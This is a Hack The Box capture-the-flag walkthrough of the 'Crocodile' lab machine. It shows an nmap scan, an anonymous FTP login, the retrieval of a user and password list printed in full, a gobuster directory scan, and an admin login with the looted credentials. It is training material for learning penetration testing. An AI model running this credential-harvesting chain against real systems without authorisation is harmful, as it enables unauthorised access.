# [Crocodile](https://app.hackthebox.com/starting-point)

## Target IP - 10.129.205.130

### Enumeration

Here we are scanning the target machine for open ports and services also we added to scan for the default scripts. In result we found that there are two services running and are open which are 21/tcp ftp and 80/tcp apache server which is hosting a http site which can be accessed using the ip address.

**Command 1** -

`nmap -sC -sV 10.129.205.130`

**Output** -
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 21:50 IST
Nmap scan report for 10.129.205.130
Host is up (0.24s latency).
Not shown: 701 filtered tcp ports (no-response), 297 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.16.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.86 seconds
```

### Foothold

Now we accessed the ftp server of the target using the ftp client and got the shell using the `anonymous` username which gives the ftp shell.

**Command 2** -

`ftp 10.129.205.130`

**Output** - 

```
Connected to 10.129.205.130.
220 (vsFTPd 3.0.3)
Name (10.129.205.130:goobar07): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Listing the contents of the server using `ls`.

**Command 3** -

`ls`

**Output** -

```
229 Entering Extended Passive Mode (|||49539|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
```

Now downloading the file one by one using the `get` command.

**Command 4** -

`get allowed.userlist`

**Output** -

```
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||44833|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |********************************************************************************|    33      205.26 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.04 KiB/s)
```

**Command 5** -

`get allowed.userlist.passwd`

**Output** - 

```
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||47435|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |********************************************************************************|    62        0.27 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.06 KiB/s)
```

The files we downloaded through the ftp server contains the username and password of the users and we get the highest user as `admin`. The contents of the files are as following -

**allowed.userlist** -

```
aron
pwnmeow
egotisticalsw
admin
```

**allowed.userlist.passwd** -

```
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Now we accessed the site on the http://10.129.205.130/

![Website Home Page](https://github.com/goobar07/HTB-30_Day-Challenge/blob/main/Tier_1/Crocodile/Photo_1.png)

### Enumeration 2

Now we also looked into the websites technologies using the wappalyzer extenstion by which we found out that the site uses the php as the programming language.

![Home Page with Wapplyzer extension](https://github.com/goobar07/HTB-30_Day-Challenge/blob/main/Tier_1/Crocodile/Photo_2.png)

Now we will use gobuster to find all the possible directories present in the site. The wordlist we used was downloaded through github the repo name is SecLists and also we will add extensions for the scan which are .php and .html so that we have files with these extensions. Also I was getting so many errors and I got the initial files I wanted so then I quited the program using keyboard interupt.

**Command 6** -

`gobuster dir --url http://10.129.205.130/ --wordlist SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,h
tml`

**Output** -

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.205.130/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 58565]
/login.php            (Status: 200) [Size: 1577]
/assets               (Status: 301) [Size: 317] [--> http://10.129.205.130/assets/]
/css                  (Status: 301) [Size: 314] [--> http://10.129.205.130/css/]
/js                   (Status: 301) [Size: 313] [--> http://10.129.205.130/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.205.130/fonts/]
/dashboard            (Status: 301) [Size: 320] [--> http://10.129.205.130/dashboard/]
Progress: 10713 / 262995 (4.07%)[ERROR] Get "http://10.129.205.130/732.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/1761.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/1761": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 10716 / 262995 (4.07%)[ERROR] Get "http://10.129.205.130/1761.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/562": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/562.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/562.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/703.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/703": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/703.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 10723 / 262995 (4.08%)[ERROR] Get "http://10.129.205.130/1373.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/1373": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/1373.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 10726 / 262995 (4.08%)[ERROR] Get "http://10.129.205.130/477": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/477.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/477.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/714": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/1527.php": dial tcp 10.129.205.130:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/1527.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/1527": dial tcp 10.129.205.130:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
Progress: 10733 / 262995 (4.08%)[ERROR] Get "http://10.129.205.130/714.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/530": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/714.html": dial tcp 10.129.205.130:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
Progress: 10736 / 262995 (4.08%)[ERROR] Get "http://10.129.205.130/530.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/530.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/512": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/nintendo": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/512.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/nintendo.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/512.html": dial tcp 10.129.205.130:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
Progress: 13450 / 262995 (5.11%)[ERROR] Get "http://10.129.205.130/624.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/624": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/624.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/phpadsnew.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/phpadsnew": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/addnews.php": dial tcp 10.129.205.130:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/addnews": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/addnews.html": dial tcp 10.129.205.130:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/purchasing": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/phpadsnew.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 19392 / 262995 (7.37%)[ERROR] Get "http://10.129.205.130/Golf.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/App.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/App": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/App.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/Germany": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/bitdefender.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/bitdefender": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/Germany.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/bitdefender.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.205.130/Germany.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 22283 / 262995 (8.47%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 22283 / 262995 (8.47%)
===============================================================
Finished
===============================================================
```

### Foothold 2

Now we can access the http://10.129.205.130/login.php which a user login page which can be used to login as a admin because we have the credentials of the admin user.

![Login Page](https://github.com/goobar07/HTB-30_Day-Challenge/blob/main/Tier_1/Crocodile/Photo_3.png)

Finally after logining as a admin we get the flag for the machine.

![Dasboard Page](https://github.com/goobar07/HTB-30_Day-Challenge/blob/main/Tier_1/Crocodile/Photo_4.png)

### This machine has been pawned

~goobar07
